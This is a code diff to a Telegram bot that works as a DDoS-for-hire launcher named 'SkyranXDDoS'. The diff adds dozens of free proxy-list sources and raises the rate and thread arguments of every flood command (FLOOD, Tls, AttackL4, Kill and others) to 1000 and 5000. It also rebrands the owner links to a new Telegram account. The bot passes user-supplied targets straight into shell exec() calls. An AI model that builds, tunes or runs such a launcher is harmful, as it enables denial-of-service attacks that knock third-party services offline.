@@ -10,7 +10,17 @@ const bot = new TelegramBot(token, {polling: true});
 const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
 const adminIds = adminData.admins;
 const timeLimit = parseInt(adminData.limit, 10000);
+const express = require('express')
+const app = express()
+const port = process.env.PORT || 4000;
 
+app.get('/', (req, res) => {
+  res.send('Hello World!')
+})
+
+app.listen(port, () => {
+  console.log(`Example app listening on port ${port}`)
+})
 console.log(figlet.textSync('SkyranXDDoS', {
     font: 'Standard',
     horizontalLayout: 'default',
@@ -51,6 +61,46 @@ const urls = [
   'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
   'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
   'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
+  "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+  "https://www.proxy-list.download/api/v1/get?type=http",
+  "https://api.openproxylist.xyz/http.txt",
+    "http://alexa.lr2b.com/proxylist.txt",
+  "https://multiproxy.org/txt_all/proxy.txt",
+  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
+  "https://openproxylist.xyz/http.txt",
+  "https://proxyspace.pro/http.txt",
+  "https://proxyspace.pro/https.txt",
+  "https://rootjazz.com/proxies/proxies.txt",
+    "https://www.proxy-list.download/api/v1/get?type=https",
+  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
+  "https://www.proxy-list.download/api/v1/get?type=socks5",
+  "https://www.proxyscan.io/download?type=socks5",
+  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+  "https://api.openproxylist.xyz/socks5.txt",
+  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
+  "https://openproxylist.xyz/socks5.txt",
+  "https://proxyspace.pro/socks5.txt",
+  "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
+  "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+  "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+  "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
+  "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+  "https://proxy-spider.com/api/proxies.example.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
+  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+  "https://rootjazz.com/proxies/proxies.txt",
   'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
 ];
 
@@ -192,7 +242,7 @@ bot.onText(/^\/Zamss-XcV(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Zamss-XcV.js ${target} ${time} 350 100 proxy.txt`);
+  const process = exec(`node Zamss-XcV.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -227,7 +277,7 @@ bot.onText(/^\/zamss(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node zamss.js ${target} ${time} 305 100 proxy.txt`);
+  const process = exec(`node zamss.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -262,7 +312,7 @@ bot.onText(/^\/Tlsvip(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Tlsvip.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node Tlsvip.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -297,7 +347,7 @@ bot.onText(/^\/Tls(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Tls.js ${target} ${time} 35 100 proxy.txt`);
+  const process = exec(`node Tls.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -332,7 +382,7 @@ bot.onText(/^\/AttackL4(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node AttackL4.js ${target} ${time} 35 100 proxy.txt`);
+  const process = exec(`node AttackL4.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -402,7 +452,7 @@ bot.onText(/^\/MakLu(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node MakLu.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node MakLu.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -437,7 +487,7 @@ bot.onText(/^\/Kontol(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Kontol.js ${target} ${time} 35 100 proxy.txt`);
+  const process = exec(`node Kontol.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -472,7 +522,7 @@ bot.onText(/^\/FLOOD(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node FLOOD.js ${target} ${time} 350 100 proxy.txt`);
+  const process = exec(`node FLOOD.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -507,7 +557,7 @@ bot.onText(/^\/Kill(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node StarsXKill.js ${target} ${time} 300 1000 proxy.txt`);
+  const process = exec(`node StarsXKill.js ${target} ${time} 1000 5000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -646,7 +696,7 @@ bot.onText(/\/cekbot/, (msg) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'Zamss-XcV', url: `https://t.me/UserMakLu` }
+            { text: 'Zamss-XcV', url: `https://t.me/quangnqtoolcode` }
           ]
         ]
       },
@@ -731,15 +781,15 @@ bot.onText(/\/owner/, (msg) => {
       const buttons = [
         {
           text: 'Instagram',
-          url: 'https://www.instagram.com/medancyberteam'
+          url: 'https://t.me/quangnqtoolcode'
         },
         {
           text: 'Telegram',
-          url: 'https://t.me/UserMakLu'
+          url: 'https://t.me/quangnqtoolcode'
         },
         {
           text: 'CH TEAM',
-          url: 'https://t.me/medancyberteamm'
+          url: 'https://t.me/quangnqtoolcode'
         }
       ];
       bot.sendMessage(chatId, `Halo kak ${name}, kamu bisa terhubung dengan owner Zamss-XcV melalui link di bawah:`, {
